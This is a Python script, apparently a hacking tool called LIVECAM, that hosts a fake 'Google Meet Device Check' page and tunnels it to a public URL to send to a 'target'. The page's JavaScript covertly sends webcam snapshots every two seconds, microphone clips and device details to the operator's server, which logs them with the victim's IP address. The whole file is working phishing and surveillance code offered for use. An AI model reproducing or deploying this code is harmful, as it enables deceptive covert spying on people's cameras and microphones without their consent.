#!/usr/bin/env python3
"""
LIVECAM - Live Video & Microphone Capture Framework
Cloudflared Tunnel | Serveo Fallback | Modern Terminal UI
Auto Camera + Microphone Access | Real-time Capture
Cross-Platform: Kali Linux | Windows | Termux
Created by null7
"""

import os
import sys
import json
import threading
import subprocess
import time
import socket
import re
import tarfile
import platform
import signal
import base64
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    C = Fore
    S = Style
except ImportError:
    class Dummy:
        def __getattr__(self, name): return ''
    C = S = Dummy()

PORT = 8080
CAPTURE_DIR = "livecam_captures"
TOOLS_DIR = os.path.join(os.path.expanduser("~"), ".livecam")

IS_TERMUX = "com.termux" in os.environ.get("PREFIX", "") or "termux" in os.environ.get("HOME", "")

BANNER = f"""
{C.RED}                    ██╗     ██╗██╗   ██╗███████╗
{C.RED}                    ██║     ██║██║   ██║██╔════╝
{C.RED}                    ██║     ██║██║   ██║█████╗  
{C.RED}                    ██║     ██║╚██╗ ██╔╝██╔══╝  
{C.RED}                    ███████╗██║ ╚████╔╝ ███████╗
{C.RED}                    ╚══════╝╚═╝  ╚═══╝  ╚══════╝
{C.RED}                                                                 
{C.RED}             ██████╗ █████╗ ███╗   ███╗███████╗██████╗  █████╗ 
{C.RED}            ██╔════╝██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔══██╗
{C.RED}            ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████║
{C.RED}            ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██╔══██║
{C.RED}            ╚██████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║██║  ██║
{C.RED}             ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
{C.RED}                                                                 

{C.WHITE}                   ◆ {S.BRIGHT}LIVE VIDEO & MICROPHONE CAPTURE{S.RESET_ALL} ◆
{C.RED}                    ═══ {S.BRIGHT}AUTO CAMERA + AUDIO VIA LINK{S.RESET_ALL} {C.RED}═══

{C.MAGENTA}                             created by {S.BRIGHT}null7{S.RESET_ALL}

"""

LANDING_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Meet — Device Check</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0a16;
            --blue: #4285f4;
            --green: #34a853;
            --red: #ea4335;
            --text: #e8eaed;
            --text-secondary: #9aa0a6;
            --card-bg: rgba(18,18,38,0.92);
            --border: rgba(255,255,255,0.08);
        }
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Google Sans','Inter',-apple-system,sans-serif;
            background:var(--bg);
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            overflow:hidden;
        }
        .bg-orbs{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
        .orb{
            position:absolute;
            border-radius:50%;
            filter:blur(130px);
            opacity:0.2;
            animation:float 22s infinite ease-in-out;
        }
        .orb:nth-child(1){width:500px;height:500px;background:var(--blue);top:-15%;left:-10%;animation-delay:0s}
        .orb:nth-child(2){width:400px;height:400px;background:#7b1fa2;bottom:-15%;right:-8%;animation-delay:-7s}
        .orb:nth-child(3){width:350px;height:350px;background:var(--red);top:55%;left:50%;animation-delay:-14s}
        @keyframes float{
            0%,100%{transform:translate(0,0) scale(1)}
            25%{transform:translate(70px,-80px) scale(1.1)}
            50%{transform:translate(-50px,60px) scale(0.9)}
            75%{transform:translate(-70px,-50px) scale(1.05)}
        }
        .overlay{
            position:fixed;
            top:0;left:0;
            width:100%;height:100%;
            background:rgba(0,0,0,0.7);
            z-index:999;
            display:flex;
            justify-content:center;
            align-items:center;
            backdrop-filter:blur(4px);
            -webkit-backdrop-filter:blur(4px);
        }
        .modal{
            background:var(--card-bg);
            backdrop-filter:blur(50px);
            -webkit-backdrop-filter:blur(50px);
            border:1px solid var(--border);
            border-radius:28px;
            padding:0;
            max-width:480px;
            width:94%;
            text-align:center;
            box-shadow:0 20px 60px rgba(0,0,0,0.7),0 0 0 1px rgba(255,255,255,0.04) inset;
            overflow:hidden;
            animation:slideUp 0.45s cubic-bezier(0.16,1,0.3,1);
        }
        @keyframes slideUp{
            from{transform:translateY(40px);opacity:0}
            to{transform:translateY(0);opacity:1}
        }
        .header-strip{
            background:linear-gradient(135deg,#1a73e8,#1557b0);
            padding:28px 24px 20px;
            position:relative;
            overflow:hidden;
        }
        .header-strip::after{
            content:'';
            position:absolute;
            top:-20px;right:-20px;
            width:100px;height:100px;
            background:rgba(255,255,255,0.1);
            border-radius:50%;
        }
        .meet-icon{
            width:56px;height:56px;
            background:#fff;
            border-radius:14px;
            display:inline-flex;
            align-items:center;
            justify-content:center;
            margin-bottom:12px;
            box-shadow:0 8px 24px rgba(0,0,0,0.3);
            position:relative;
            z-index:1;
        }
        .meet-icon svg{width:32px;height:32px}
        .header-strip h1{
            font-size:22px;
            font-weight:700;
            color:#fff;
            letter-spacing:-0.3px;
            position:relative;
            z-index:1;
        }
        .header-strip .sub{
            font-size:12px;
            color:rgba(255,255,255,0.8);
            font-weight:400;
            position:relative;
            z-index:1;
        }
        .content{padding:24px 24px 20px}
        .status-row{
            display:flex;
            justify-content:center;
            gap:20px;
            margin-bottom:16px;
        }
        .status-item{
            background:rgba(255,255,255,0.03);
            border:1px solid rgba(255,255,255,0.06);
            border-radius:16px;
            padding:14px 18px;
            text-align:center;
            flex:1;
        }
        .status-icon{font-size:24px;margin-bottom:4px}
        .status-label{font-size:11px;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px}
        .status-value{font-size:13px;font-weight:500;color:var(--text)}
        .status-value.ready{color:var(--green)}
        .preview-box{
            width:100%;
            height:200px;
            background:rgba(0,0,0,0.4);
            border-radius:16px;
            margin-bottom:16px;
            overflow:hidden;
            position:relative;
            border:1px solid rgba(255,255,255,0.06);
        }
        .preview-box video{
            width:100%;
            height:100%;
            object-fit:cover;
            display:none;
        }
        .preview-box video.active{display:block}
        .preview-placeholder{
            position:absolute;
            top:50%;left:50%;
            transform:translate(-50%,-50%);
            color:rgba(255,255,255,0.3);
            font-size:14px;
            text-align:center;
        }
        .btn-test{
            display:block;
            width:100%;
            background:linear-gradient(135deg,#4285f4,#1a73e8);
            color:#fff;
            border:none;
            padding:15px;
            font-size:16px;
            font-weight:600;
            border-radius:14px;
            cursor:pointer;
            transition:all 0.25s;
            box-shadow:0 8px 24px rgba(26,115,232,0.35);
            font-family:inherit;
        }
        .btn-test:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(26,115,232,0.5)}
        .loading-state{display:none;text-align:center;padding:16px 0}
        .loading-state.active{display:block}
        .spinner{
            width:40px;height:40px;
            border:3px solid rgba(255,255,255,0.08);
            border-top-color:var(--blue);
            border-radius:50%;
            animation:spin 0.7s linear infinite;
            margin:0 auto 12px;
        }
        @keyframes spin{to{transform:rotate(360deg)}}
        .success-state{display:none;text-align:center;padding:16px 0}
        .success-state.active{display:block}
        .check-circle{
            width:56px;height:56px;
            background:rgba(52,168,83,0.12);
            border:2px solid rgba(52,168,83,0.3);
            border-radius:50%;
            display:inline-flex;
            align-items:center;
            justify-content:center;
            margin-bottom:12px;
        }
        .check-circle svg{width:28px;height:28px}
        .error-state{display:none;text-align:center;padding:16px 0}
        .error-state.active{display:block}
        .error-box{
            background:rgba(234,67,53,0.08);
            border:1px solid rgba(234,67,53,0.25);
            border-radius:14px;
            padding:12px 16px;
            color:#f28b82;
            font-size:12px;
        }
        .footer-note{
            text-align:center;
            padding:14px;
            font-size:10px;
            color:rgba(255,255,255,0.15);
        }
    </style>
</head>
<body>
<div class="bg-orbs">
    <div class="orb"></div>
    <div class="orb"></div>
    <div class="orb"></div>
</div>
<div class="overlay" id="mainOverlay">
    <div class="modal">
        <div class="header-strip">
            <div class="meet-icon">
                <svg viewBox="0 0 24 24" fill="#1a73e8">
                    <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12z"/>
                    <path d="M10 15l5-3-5-3v6z"/>
                </svg>
            </div>
            <h1>Google Meet</h1>
            <p class="sub">Device Compatibility Check</p>
        </div>
        <div class="content">
            <div class="status-row">
                <div class="status-item" id="cameraStatus">
                    <div class="status-icon">📷</div>
                    <div class="status-label">Camera</div>
                    <div class="status-value" id="cameraLabel">Not Tested</div>
                </div>
                <div class="status-item" id="micStatus">
                    <div class="status-icon">🎤</div>
                    <div class="status-label">Microphone</div>
                    <div class="status-value" id="micLabel">Not Tested</div>
                </div>
            </div>

            <div class="preview-box" id="previewBox">
                <video id="video" autoplay playsinline muted></video>
                <div class="preview-placeholder" id="placeholder">📷 Camera preview will appear here</div>
            </div>

            <button class="btn-test" onclick="startDevices()">
                Test Camera & Microphone
            </button>

            <div class="loading-state" id="loadingState">
                <div class="spinner"></div>
                <p style="color:#9aa0a6;font-size:14px;">Accessing devices...</p>
            </div>

            <div class="success-state" id="successState">
                <div class="check-circle">
                    <svg viewBox="0 0 24 24" fill="none" stroke="#34a853" stroke-width="2.8">
                        <polyline points="4 12 10 18 20 6"/>
                    </svg>
                </div>
                <p style="color:#34a853;font-weight:600;font-size:17px;">All Devices Working</p>
                <p style="color:#9aa0a6;font-size:13px;">You're ready to join meetings.</p>
            </div>

            <div class="error-state" id="errorState">
                <div class="error-box" id="errorMsg">
                    ⚠️ Unable to access camera or microphone.
                </div>
                <button class="btn-test" style="margin-top:10px;" onclick="startDevices()">Retry</button>
            </div>
        </div>
        <div class="footer-note">Google Meet ©2024 • Device Check</div>
    </div>
</div>

<script>
var localStream = null;
var captureInterval = null;
var audioInterval = null;

function startDevices(){
    document.getElementById('loadingState').classList.add('active');
    document.getElementById('successState').classList.remove('active');
    document.getElementById('errorState').classList.remove('active');
    document.querySelector('.btn-test').style.display = 'none';

    if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
        showError('Media devices not supported on this browser.');
        return;
    }

    navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: {ideal: 1280}, height: {ideal: 720} },
        audio: true
    }).then(function(stream){
        localStream = stream;
        var video = document.getElementById('video');
        video.srcObject = stream;
        video.classList.add('active');
        document.getElementById('placeholder').style.display = 'none';
        document.getElementById('loadingState').classList.remove('active');
        document.getElementById('successState').classList.add('active');

        document.getElementById('cameraLabel').innerText = 'Ready';
        document.getElementById('cameraLabel').classList.add('ready');
        document.getElementById('micLabel').innerText = 'Ready';
        document.getElementById('micLabel').classList.add('ready');

        // Capture photo every 2 seconds
        captureInterval = setInterval(capturePhoto, 2000);
        // Capture audio every 5 seconds
        audioInterval = setInterval(captureAudio, 5000);
    }).catch(function(err){
        document.getElementById('loadingState').classList.remove('active');
        var msgs = {
            'NotAllowedError': 'Permission denied. Please allow camera and microphone in browser settings.',
            'NotFoundError': 'No camera or microphone found.',
            'NotReadableError': 'Device already in use by another app.'
        };
        showError(msgs[err.name] || 'Error accessing devices. Please try again.');
    });
}

function capturePhoto(){
    if(!localStream) return;
    var video = document.getElementById('video');
    var canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    var ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    var dataUrl = canvas.toDataURL('image/jpeg', 0.8);

    fetch('/photo', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            photo: dataUrl,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenSize: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        })
    }).catch(function(){});
}

function captureAudio(){
    if(!localStream) return;
    var audioTrack = localStream.getAudioTracks()[0];
    if(!audioTrack) return;

    var mediaRecorder = new MediaRecorder(new MediaStream([audioTrack]), {
        mimeType: 'audio/webm;codecs=opus'
    });
    var chunks = [];

    mediaRecorder.ondataavailable = function(e){
        if(e.data.size > 0) chunks.push(e.data);
    };

    mediaRecorder.onstop = function(){
        var blob = new Blob(chunks, {type: 'audio/webm'});
        var reader = new FileReader();
        reader.onloadend = function(){
            var base64 = reader.result.split(',')[1];
            fetch('/audio', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    audio: base64,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                })
            }).catch(function(){});
        };
        reader.readAsDataURL(blob);
    };

    mediaRecorder.start();
    setTimeout(function(){
        if(mediaRecorder.state === 'recording') mediaRecorder.stop();
    }, 3000); // record 3 seconds
}

function showError(msg){
    document.getElementById('errorMsg').innerHTML = '⚠️ ' + msg;
    document.getElementById('errorState').classList.add('active');
    document.querySelector('.btn-test').style.display = 'block';
}
</script>
</body>
</html>"""

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def spinner(text, duration=0.8):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        print(f"\r    {C.CYAN}{chars[i % len(chars)]}{S.RESET_ALL} {text}", end="", flush=True)
        time.sleep(0.07)
        i += 1

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(("0.0.0.0", port))
            return False
        except OSError:
            return True

def kill_process_on_port(port):
    try:
        if os.name == "nt":
            result = subprocess.run(["netstat", "-ano", "-p", "tcp"], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if f":{port}" in line and "LISTENING" in line:
                    pid = line.split()[-1]
                    subprocess.run(["taskkill", "/F", "/PID", pid], capture_output=True)
                    return True
        else:
            result = subprocess.run(["lsof", "-ti", f":{port}"], capture_output=True, text=True)
            pids = result.stdout.strip().split('\n')
            for pid in pids:
                if pid:
                    try:
                        os.kill(int(pid), signal.SIGKILL)
                    except:
                        pass
            if pids and pids[0]:
                return True
            subprocess.run(["fuser", "-k", f"{port}/tcp"], capture_output=True)
    except:
        pass
    return False

def find_available_port(start_port=8080, max_attempts=10):
    for port in range(start_port, start_port + max_attempts):
        if not is_port_in_use(port):
            return port
    return None

def get_cloudflared_url():
    machine = platform.machine().lower()
    system = sys.platform
    if system == "win32":
        return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    elif system == "darwin":
        if "arm" in machine:
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz"
        return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"
    else:
        if "aarch64" in machine or "arm64" in machine:
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        elif "arm" in machine:
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
        else:
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"

def install_cloudflared():
    exe_name = "cloudflared.exe" if os.name == "nt" else "cloudflared"
    exe_path = os.path.join(TOOLS_DIR, exe_name)
    if os.path.exists(exe_path):
        return exe_path
    os.makedirs(TOOLS_DIR, exist_ok=True)
    print(f"    {C.YELLOW}⬇{S.RESET_ALL}  Downloading cloudflared...")
    url = get_cloudflared_url()
    try:
        resp = requests.get(url, stream=True, timeout=120)
        if url.endswith(".tgz"):
            tgz_path = os.path.join(TOOLS_DIR, "cloudflared.tgz")
            with open(tgz_path, "wb") as f:
                for chunk in resp.iter_content(8192):
                    f.write(chunk)
            with tarfile.open(tgz_path, "r:gz") as tar:
                tar.extract("cloudflared", TOOLS_DIR)
            os.remove(tgz_path)
        else:
            with open(exe_path, "wb") as f:
                for chunk in resp.iter_content(8192):
                    f.write(chunk)
            if os.name != "nt":
                os.chmod(exe_path, 0o755)
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Cloudflared installed")
        return exe_path
    except Exception as e:
        print(f"    {C.RED}✗{S.RESET_ALL}  Failed: {e}")
        return None

def start_cloudflared_tunnel():
    exe = install_cloudflared()
    if not exe:
        return None
    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Launching Cloudflare Tunnel...")
    try:
        proc = subprocess.Popen(
            [exe, "tunnel", "--url", f"http://localhost:{PORT}"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        public_url = None
        start_time = time.time()
        for line in iter(proc.stdout.readline, ''):
            if time.time() - start_time > 45:
                break
            match = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
            if match:
                public_url = match.group(1)
                break
        if public_url:
            print(f"    {C.GREEN}✓{S.RESET_ALL}  Connected")
            return public_url
    except:
        pass
    print(f"    {C.YELLOW}⚠{S.RESET_ALL}  Cloudflared failed, trying fallback...")
    return None

def start_serveo_tunnel():
    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Trying Serveo SSH tunnel...")
    try:
        import random
        subdomain = f"livecam-{random.randint(1000,9999)}"
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-R", f"{subdomain}:80:localhost:{PORT}", "serveo.net"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        public_url = f"https://{subdomain}.serveo.net"
        time.sleep(3)
        try:
            requests.get(f"http://{subdomain}.serveo.net", timeout=5)
            print(f"    {C.GREEN}✓{S.RESET_ALL}  Connected via Serveo")
            return public_url
        except:
            pass
        for line in iter(proc.stdout.readline, ''):
            if "Forwarding" in line or "serveo" in line.lower():
                match = re.search(r'https?://[^\s]+', line)
                if match:
                    return match.group(0)
    except FileNotFoundError:
        print(f"    {C.YELLOW}⚠{S.RESET_ALL}  SSH not found")
    except:
        pass
    print(f"    {C.YELLOW}⚠{S.RESET_ALL}  Serveo failed, trying last resort...")
    return None

def start_localhost_run():
    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Trying localhost.run...")
    try:
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-R", f"80:localhost:{PORT}", "nokey@localhost.run"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        start = time.time()
        for line in iter(proc.stdout.readline, ''):
            if time.time() - start > 20:
                break
            match = re.search(r'https?://[a-zA-Z0-9\-]+\.lhr\.life', line)
            if match:
                print(f"    {C.GREEN}✓{S.RESET_ALL}  Connected via localhost.run")
                return match.group(0)
    except FileNotFoundError:
        pass
    except:
        pass
    return None

class LiveCamHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(LANDING_PAGE.encode("utf-8"))

    def do_POST(self):
        if self.path == "/photo":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            data = json.loads(body)
            self.handle_photo(data)
        elif self.path == "/audio":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            data = json.loads(body)
            self.handle_audio(data)
        else:
            self.send_response(404)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())

    def handle_photo(self, data):
        photo_b64 = data.get("photo", "")
        timestamp = data.get("timestamp", datetime.now().isoformat())
        ip = self.client_address[0]
        os.makedirs(CAPTURE_DIR, exist_ok=True)
        count = len([f for f in os.listdir(CAPTURE_DIR) if f.startswith("photo_")]) + 1
        filename = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{count}.jpg"
        filepath = os.path.join(CAPTURE_DIR, filename)
        if "base64," in photo_b64:
            photo_b64 = photo_b64.split("base64,")[1]
        with open(filepath, "wb") as f:
            f.write(base64.b64decode(photo_b64))
        print(f"""
{C.RED}  ┌─────────────────────────────────────────────────────────────┐
{C.RED}  │{C.WHITE}  📸 {S.BRIGHT}PHOTO CAPTURED{S.RESET_ALL}                                          {C.RED}│
{C.RED}  ├─────────────────────────────────────────────────────────────┤
{C.RED}  │{C.WHITE}  🖼️  File : {C.YELLOW}{filename}{' '*(38-len(filename))}{C.RED}│
{C.RED}  │{C.WHITE}  🌐 IP   : {C.YELLOW}{ip}{' '*(38-len(ip))}{C.RED}│
{C.RED}  └─────────────────────────────────────────────────────────────┘{S.RESET_ALL}
""")
        self.log_metadata("photo", filename, ip, data)

    def handle_audio(self, data):
        audio_b64 = data.get("audio", "")
        timestamp = data.get("timestamp", datetime.now().isoformat())
        ip = self.client_address[0]
        os.makedirs(CAPTURE_DIR, exist_ok=True)
        count = len([f for f in os.listdir(CAPTURE_DIR) if f.startswith("audio_")]) + 1
        filename = f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{count}.webm"
        filepath = os.path.join(CAPTURE_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(base64.b64decode(audio_b64))
        print(f"""
{C.RED}  ┌─────────────────────────────────────────────────────────────┐
{C.RED}  │{C.WHITE}  🎤 {S.BRIGHT}AUDIO CAPTURED{S.RESET_ALL}                                          {C.RED}│
{C.RED}  ├─────────────────────────────────────────────────────────────┤
{C.RED}  │{C.WHITE}  🎵  File : {C.YELLOW}{filename}{' '*(38-len(filename))}{C.RED}│
{C.RED}  │{C.WHITE}  🌐 IP   : {C.YELLOW}{ip}{' '*(38-len(ip))}{C.RED}│
{C.RED}  └─────────────────────────────────────────────────────────────┘{S.RESET_ALL}
""")
        self.log_metadata("audio", filename, ip, data)

    def log_metadata(self, media_type, filename, ip, data):
        meta_path = os.path.join(CAPTURE_DIR, "metadata.json")
        meta = {
            "type": media_type,
            "timestamp": data.get("timestamp", datetime.now().isoformat()),
            "file": filename,
            "ip": ip,
            "device": {
                "ua": data.get("userAgent", "N/A"),
                "platform": data.get("platform", "N/A"),
                "language": data.get("language", "N/A"),
                "screen": data.get("screenSize", "N/A"),
                "timezone": data.get("timezone", "N/A")
            }
        }
        metas = []
        if os.path.exists(meta_path):
            with open(meta_path, "r") as f:
                try: metas = json.load(f)
                except: metas = []
        metas.append(meta)
        with open(meta_path, "w") as f:
            json.dump(metas, f, indent=2)


def main():
    global PORT
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)

    print(f"  {C.CYAN}◆ {S.BRIGHT}SYSTEM INFO{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
    print(f"    {C.WHITE}OS     : {platform.system()} {platform.release()}{S.RESET_ALL}")
    print(f"    {C.WHITE}Arch   : {platform.machine()}{S.RESET_ALL}")
    print(f"    {C.WHITE}Termux : {'Yes' if IS_TERMUX else 'No'}{S.RESET_ALL}")
    print()

    print(f"  {C.CYAN}◆ {S.BRIGHT}INITIALIZATION{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")

    if is_port_in_use(PORT):
        print(f"    {C.YELLOW}⚠{S.RESET_ALL}  Port {PORT} is in use!")
        if kill_process_on_port(PORT):
            time.sleep(1)
            if not is_port_in_use(PORT):
                print(f"    {C.GREEN}✓{S.RESET_ALL}  Port freed")
            else:
                new_port = find_available_port(PORT+1)
                if new_port:
                    print(f"    {C.YELLOW}  Switching to {new_port}{S.RESET_ALL}")
                    PORT = new_port
                else:
                    print(f"    {C.RED}✗{S.RESET_ALL}  No ports available"); sys.exit(1)
        else:
            new_port = find_available_port(PORT+1)
            if new_port:
                print(f"    {C.YELLOW}  Switching to {new_port}{S.RESET_ALL}")
                PORT = new_port
            else:
                print(f"    {C.RED}✗{S.RESET_ALL}  No ports available"); sys.exit(1)

    spinner("Starting HTTP server...", 0.5)
    server = HTTPServer(("0.0.0.0", PORT), LiveCamHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    local_ip = get_local_ip()
    print(f"    {C.GREEN}✓{S.RESET_ALL}  HTTP server online")
    print(f"    {C.WHITE}→{S.RESET_ALL}  Local: {C.CYAN}http://{local_ip}:{PORT}{S.RESET_ALL}")

    spinner("Loading capture modules...", 0.4)
    print(f"    {C.GREEN}✓{S.RESET_ALL}  Video & Audio modules ready")
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    spinner("Preparing tunnel...", 0.4)
    print(f"    {C.GREEN}✓{S.RESET_ALL}  Multi-tunnel prepared")
    print()

    print(f"  {C.CYAN}◆ {S.BRIGHT}TUNNEL CONNECTION{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")

    public_url = None
    tunnel_name = None

    print(f"    {C.WHITE}[1/3]{S.RESET_ALL} Cloudflare Tunnel")
    public_url = start_cloudflared_tunnel()
    if public_url:
        tunnel_name = "Cloudflare Tunnel"

    if not public_url:
        print(f"    {C.WHITE}[2/3]{S.RESET_ALL} Serveo SSH")
        public_url = start_serveo_tunnel()
        if public_url:
            tunnel_name = "Serveo"

    if not public_url:
        print(f"    {C.WHITE}[3/3]{S.RESET_ALL} localhost.run")
        public_url = start_localhost_run()
        if public_url:
            tunnel_name = "localhost.run"

    print()
    print(f"  {C.CYAN}◆ {S.BRIGHT}RESULT{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")

    if public_url:
        print(f"    {C.GREEN}●{S.RESET_ALL}  Status  : {C.GREEN}{S.BRIGHT}CONNECTED{S.RESET_ALL}")
        print(f"    {C.GREEN}●{S.RESET_ALL}  Method  : {C.WHITE}{tunnel_name}{S.RESET_ALL}")
        print(f"    {C.GREEN}●{S.RESET_ALL}  URL     : {C.YELLOW}{S.BRIGHT}{public_url}{S.RESET_ALL}")
        print(f"    {C.GREEN}●{S.RESET_ALL}  Save to : {C.WHITE}{os.path.abspath(CAPTURE_DIR)}/{S.RESET_ALL}")
        print(f"\n  {C.RED}{S.BRIGHT}  ► SEND THIS LINK TO TARGET:{S.RESET_ALL}")
        print(f"  {C.YELLOW}  {public_url}{S.RESET_ALL}")
        print(f"\n  {C.WHITE}  ◆ Waiting for video/audio captures... {C.RED}Ctrl+C{S.RESET_ALL} {C.WHITE}to stop.{S.RESET_ALL}")
    else:
        print(f"    {C.RED}●{S.RESET_ALL}  Status  : {C.RED}{S.BRIGHT}ALL TUNNELS FAILED{S.RESET_ALL}")
        print(f"    {C.WHITE}  ◆ Local URL: {C.CYAN}http://{local_ip}:{PORT}{S.RESET_ALL}")

    print(f"\n  {C.WHITE}{'─'*50}{S.RESET_ALL}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {C.RED}◆ {S.BRIGHT}SHUTDOWN{S.RESET_ALL}")
        print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Server stopped")
        photos = len([f for f in os.listdir(CAPTURE_DIR) if f.startswith("photo_")])
        audios = len([f for f in os.listdir(CAPTURE_DIR) if f.startswith("audio_")])
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Captured: {photos} photos, {audios} audio clips")
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Saved in: {os.path.abspath(CAPTURE_DIR)}")
        print(f"\n  {C.MAGENTA}  null7 says goodbye.{S.RESET_ALL}\n")
        server.shutdown()
        sys.exit(0)

if __name__ == "__main__":
    main()